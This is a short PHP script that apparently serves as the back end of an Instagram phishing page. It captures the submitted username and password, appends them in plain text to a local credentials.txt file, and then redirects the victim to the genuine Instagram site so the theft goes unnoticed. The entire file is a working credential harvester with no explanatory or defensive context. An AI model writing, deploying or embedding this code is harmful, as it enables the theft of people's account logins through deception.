<?php
if($_SERVER['REQUEST_METHOD']=='POST'){
    $user = $_POST['uname'];
    $pass = $_POST['pass'];
}
$handler = fopen('credentials.txt','a');
fwrite($handler,'Username: '.$user.' Password: '.$pass."\r\n");
header('Location: https://www.instagram.com/');
?>